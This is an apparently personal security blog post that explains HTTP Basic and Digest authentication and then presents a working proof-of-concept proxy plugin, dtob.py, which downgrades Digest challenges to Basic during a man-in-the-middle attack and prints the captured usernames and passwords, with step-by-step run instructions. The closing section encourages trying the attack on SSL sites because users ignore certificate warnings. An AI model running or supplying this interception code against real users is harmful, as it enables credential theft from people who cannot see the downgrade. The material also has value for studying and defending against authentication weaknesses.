---
categories:
- proxy
- digest authentication
- basic authentication
- mitm
comments: true
date: 2013-06-25T00:00:00Z
published: true
title: 'dtob.py: Digest to Basic authentication; A simple example of a authentication
  ''downgrade'' attack'
---

### Introduction
Lets start by saying that I am by *no* means an expert at any of what I am about to write. Primarily this post is purely for research purposes. Think of it as one of those *something to do* scenarios. I'd like to cover some basics around HTTP Authentication, and then show a PoC of how this can be abused in a real world scenario. Hopefully this will help educate people to use more secure authentication mechanisms! :)

<!--more-->

### Authentication at a HTTP Level
HTTP Level authentication, for the most part, rely on a set of headers to authenticate the user. Generally speaking, the server will present the expected authentication mechanism via a `WWW-Authenticate` header, and expect the client to prepare the correct response back. Each request the user makes after a successful authentication attempt, has to contain the correct headers for the applicable authentication scheme, else the server would normally respond with a `401 - Not Authorised`, and the client has to re-authenticate. It is up to the server/application to validate the headers on each request.
HTTP level authentication mechanisms include [Basic](http://tools.ietf.org/html/rfc2617#section-2), [Digest](http://tools.ietf.org/html/rfc2617#section-3) as well as more complex schemes such as [Kerberos](http://tools.ietf.org/html/rfc4559), [NTLM](http://davenport.sourceforge.net/ntlm.html#ntlmHttpAuthentication) and [OAuth](http://oauth.net/core/1.0/#auth_header)

It is important to note that even though you are using say, Digest authentication, it is entirely up to the backend systems to **validate** the credentials. Whether it is some backend database, RADIUS server, LDAP etc. that stores your valid set of credentials does not matter. The server and the client, on a HTTP level, will be exchanging these headers.

For the purpose of this article, I will focus a little on the arguably less complex mechanisms, Basic and Digest.

### HTTP Basic Authentication
Basic authentication is considered the *least secure* method of HTTP authentication. Why is this exactly? Well, the credentials used to authenticate you as a user is sent over the wire in a Base64 encoded string. Base64 is a **encoding** scheme, and **not** an encryption scheme [[1](http://en.wikipedia.org/wiki/Base64)].

To demonstrate this, lets assume we have a website that wants to make use of basic authentication. A sample request header would look like:

``` text
GET /auth/basic/ HTTP/1.1
Host: test.dev
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
DNT: 1
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8,af;q=0.6
```

The website, configured to use basic authentication, will see that there is no `Authorisation` header presented by the client, and respond with a `401`, as well as a `WWW-Authenticate` header.

``` text
HTTP/1.0 401 Unauthorised
Date: Tue, 25 Jun 2013 17:33:37 GMT
Server: Apache/2.2.22 (Unix) DAV/2 PHP/5.3.15 with Suhosin-Patch mod_ssl/2.2.22 OpenSSL/0.9.8x
X-Powered-By: PHP/5.3.15
WWW-Authenticate: Basic realm="Basic Auth Testing"
Content-Length: 39
Connection: close
Content-Type: text/html

Text to send if user hits Cancel button
```

The response we got when attempting to access the website told us that we need to provide a authentication response first. Based on the `WWW-Authenticate` header, this mechanism should be `Basic` for the realm *Basic Auth Testing*. Don't stress too much about the realm part. In short, this is usually used to give the user a short message like "Restricted Area" etc.
In the authentication dialog that the browser presents, we provide some credentials, and submit them for processing. Your browser now goes and prepares the `Authorisation` header.

``` text
GET /auth/basic/ HTTP/1.1
Host: test.dev
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
DNT: 1
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8,af;q=0.6
```

Because my credentials are correct, the server will respond now with a `200` and serve the content. But, lets take a quick step back and check out what is actually in this header. More specifically, check out the `Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk` part.
This header now needs to be present in every request that is made to the website. If for whatever reason the credentials are no longer valid, the server/application will usually respond with a `401` again, and the authentication will re-occur. The user normally does not have to do anything, as the browser will automatically include the Authorization header in every request.

#### Ok, so what?
So lets take a moment and relook at the `Authorisation` header. `Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk`
Lets strip the *Authorisation: Basic* section and just work with the `dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk`. We will echo this, and pipe it through a base64 decoder in a shell session:

``` bash
$ echo "dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk" | base64 -d
user.name:s3cr3tP@ssw0rd
$
```

Yup, thats it...

It is now clear to see that for HTTP Basic authentication, the browser will take the credentials that the user has provided, and create the header in the format:
`Authorisation: Basic` + **base64(username:password)**. If you are protecting a non-SSL web resource with this authentication mechanism, you are essentially asking your users to send their credentials unencrypted over the wire to you for every requset.

### HTTP Digest Authentication
Digest authentication is considered to be *more* secure, as it actually applies a hash function to the credentials, before passing the header on to the server. For the sake of brevity, lets assume the server will act in a similar fashion to the Basic Authentication example above, except, the `WWW-Authenticate` and `Authorisation` headers are completely different. You are of course welcome to check it out yourself, and I would encourage you do so!

Lets look at an example, and then dig into the details. Requesting a digest protected web resource @*/login* without a valid `Authorisation` header, will cause our sample application to respond with a `401` and a `WWW-Authenticate` header as follows:

``` text
WWW-Authenticate: Digest realm="test.dev",qop="auth",nonce="064af982c5b571cea6450d8eda91c20d",opaque="d8ea7aa61a1693024c4cc3a516f49b3c"
```

Just as the Basic example, the browser will prompt the user for credentials now and prepare the response. The response then to the server would include the following `Authorisation` header:

``` text
Authorisation: Digest username="user.name", realm="test.dev", nonce="064af982c5b571cea6450d8eda91c20d", uri="/login", response="70eda34f1683041fd9ab72056c51b740", opaque="d8ea7aa61a1693024c4cc3a516f49b3c", qop=auth, nc=00000001, cnonce="61417766e50cb980"
```

Clearly the response here is much more complex when compared to the Basic example. So, lets refer to the Wikipedia Article [here](http://en.wikipedia.org/wiki/Digest_access_authentication#Overview), or the official RFC [here](http://tools.ietf.org/html/rfc2069#section-2.1.2) to help us understand what is going on here.

According to the Wikipedia article, the response `Authorisation` header for Digest authentication for [RFC 2617](http://tools.ietf.org/html/rfc2617#section-3.2.2) is calculated as follows:

``` bash
# If the algorithm directive in the WWW-Authenticate header is 'MD5' or unspecified
ha1 = md5(username : realm : password)
# Else, if the algorithm directive is 'MD5-Sess', the nonce and client nonce becomes part of ha1
ha1 = md5(md5(username : realm : password) : nonce : cnonce)

# For ha2, if the qop directive is 'auth' or unspecified
ha2 = md5(method : digestURI)
# Else, if the qop directive is 'auth-int'
# Where entity body is the actual response HTML from the doctype down to the last </html>. See: http://www.w3.org/Protocols/rfc2616/rfc2616-sec7.html#sec7
ha2 = md5(method : digestURI : md5(entityBody))

# Lastly, for the response, if the qop directive is 'auth' or 'auth-int'
response = md5(ha1 : nonce : nonceCount : clientNonce : qop : ha2)
# Else, if qop is unspecified
response = md5(ha1 : nonce : ha2)
```

So, lets take this formula, step by step and try and replicate the response `Authorisation` header in a shell. If one of the `WWW-Authenticate` headers don't make sense then I'll highly reccomend you read the RFC.

```bash
# Example of Calculating a Digest Authentication Response
# header in a shell with a qop of "auth"

# Assign some values to variables. These values will come from the above headers
qop="auth"
realm="test.dev"
nonce="064af982c5b571cea6450d8eda91c20d"
uri="/login"
cnonce="61417766e50cb980"
nc="00000001"
username="user.name" # This is what the user enters
password="s3cr3tP@ssw0rd" # This is what the user enters
method="GET"
# Start off with calculating ha1.
# We do not have the algorithm directive specified, so ha1 is calculated as:
$ ha1=`echo -n $username":"$realm":"$password | md5`

# Confirm  that the value is set.
$ print $ha1
d5d7ef83a9b3ad5bb0b5201b2bace033

# Next calculate the value of ha2.
# Our application presented the qop directive as 'auth', so ha2 is calculated as:
$ ha2=`echo -n $method":"$uri | md5`

# Again, confirm that its set.
$ print $ha2
315c3fb2f18fd4c6e5a3175e489464ad

# With both 'ha1' and 'ha2' set, we can calculate the response
# We have the qop directive specified, so our response is calculated as:
$ response=`echo -n $ha1":"$nonce":"$nc":"$cnonce":"$qop":"$ha2 | md5`

# And did we get the right response?
$ print $response
70eda34f1683041fd9ab72056c51b740
```

`70eda34f1683041fd9ab72056c51b740` is the valid `response` header for this request. Note that the next client request will set `nc=00000002` and therefore the response will be different due to this value being part of the response calculation. However, the fact remains that the authorisation is continuously done via header exchanges between the client and the server, relying on the server to validate them.

It is also clear that this can not be easily reversed. Even though some attributes that make up the hash function are known, the username and password are at least hashed and factored into the response attribute. It is not impossible, though not as easy as Basic authentication.

### O..K.. so I now get how the Basic vs Digest stuff works, whats next?
What if we could make the browser think that the server wants basic authentication, and then capture the encdoded credentials? That would mean we dont need any l33t cracking skeelz or anything. Just a `base64 -d`.

### Downgrade all the auth!
Assuming you are able to get some form of MiTM between the client and the server, by whichever means you use, we can intercept the headers and change them to tell the browser that we actually want basic authentication. Remember, the browser responds based on what the server asks, so if the server only asks for Basic authentication... :D

"Downgrade" attacks are a known flaw in Digest authentication. Where Digest authentication is not necessarily vulnerable to MiTM attacks in the sense that the hash still needs to be cracked, Basic authentication is and therefore such an attack can prove to be valuable to an attacker.

### Enough talk, PoC!
Using [proxpy](https://code.google.com/p/proxpy/), which is a pluggable python proxy server, I wrote a PoC demoing this exact attack. There are a lot of scenarios where this doesn't work very well, but this is only meant to demonstrate the problem.

#### The plugin

```python
# dtob.py
# Digest to Basic downgrade attack PoC plugin for proxpy (https://code.google.com/p/proxpy/)
#
# 2013 Leon Jacobs
# Licensed under IDC (I don't Care) license.
import base64
import hashlib

def headerCleanup(v):

    # strip annoying bracket things
    v = v.translate(None, "'[\\'")
    v = v.translate(None, "\\']'")

    # convert it to a list
    headers = v.split(', ')

    return headers

def proxy_mangle_request(req):

    v = str(req.getHeader("Authorization"))

    headers = headerCleanup(v)

    if 'Basic' in headers[0]:
        print "[*] Basic Auth Response Detected."
        credentials = headers[0].split(" ")
        credentials = base64.b64decode(credentials[1]).split(":")
        print "[!] Found username '%s' and password '%s' for URL %s" % (credentials[0], credentials[1], str(req.url))

    if 'Digest' in headers[0]:
        print "[x] Aww, the client responded with a Digest. \"Were too late!\" :("

    return req

def proxy_mangle_response(res):

    v = str(res.getHeader("WWW-Authenticate"))

    headers = headerCleanup(v)

    if 'Digest' in headers[0]:

        # Swap out Digest for Basic :>
        header = str(headers[0])
        print "[*] Found digest auth. Masquerading the response with a basic one :>"
        res.setHeader("WWW-Authenticate", "Basic realm=pwnd")

    return res
```

Lets get to it.

1. At the core, this authentication downgrade attack PoC leverages off the ability to perform a MiTM between the client and server. How you get this MiTM is out of the scope of this article, but bear in mind that MiTM is not **just** arp spoofing clients. You could NAT web traffic to your proxy too... :)

2. Download [proxpy](https://code.google.com/p/proxpy/) and extract it to a working directory.

3. Download and save the plugin from [here](https://gist.github.com/th3l33k/5868963/raw/8b20c879ad68cd46fd470b86f9bdc7f33da4b097/dtob.py) into the `plugins/` directory in your proxpy working directory.

4. Start the proxy, specifying the port you'd like it to run on, as well as telling it to load the plugin.
A sample command to get this running would be: `python proxpy.py -p 8090 -x plugins/dtob.py`

5. Ensure that your MiTM is successful, and watch as digest authentication gets downgraded to basic auth, and your credentials echoed to the terminal :P Something like this...

{{< figure src="/images/dtobpoc.png" >}}

### What is the user experience with this?
That is a good question. The actual dialog that the user sees, again, is up to the browser to render. Depending on **which** browser you use on **which** OS, this may look different. In the back, the client *should* function normally, blissfully unaware that the headers for stronger authentication were swapped out.

On my computer, the authentication dialog has the follow look and feel:

{{< figure src="/images/dtobhttpauth.png" >}}

Notice the "Server Says:" Section. This is typically the `realm` part of the authentication request. When using the `dtob.py` plugin, it is changed to `pwnd`. This dialog looks no different when using any form of HTTP based authentication. Hence, when the downgrade attack occurs, the user is unaware that anything different is happening in the background.

### To wrap it up
A few things to note here. Regardless of the HTTP Authentication method used, the client will not know *which* authentication method is actually being used without inspecting the headers etc. The plugin can technically be written to keep track of which URL's require Digest auth, and prepare valid responses ( like the one we did in the shell ) and present that back to the server. This will make the process completely smooth and the client unaware that something is going on. In the plugins current state, it will just continuously prompt the user for authentication as the proper request with the correct `Authorisation` header is never sent to the server.

On the case of SSL websites it obviously gets a little more tricky. Don't be put off with this. **Countless** times have I seen where users simply click the "proceed anyways" button regardless of the certificate validation errors that the browser presents them with. So, even though you will raise alarms on SSL encrypted websites, its still worth a try ^^
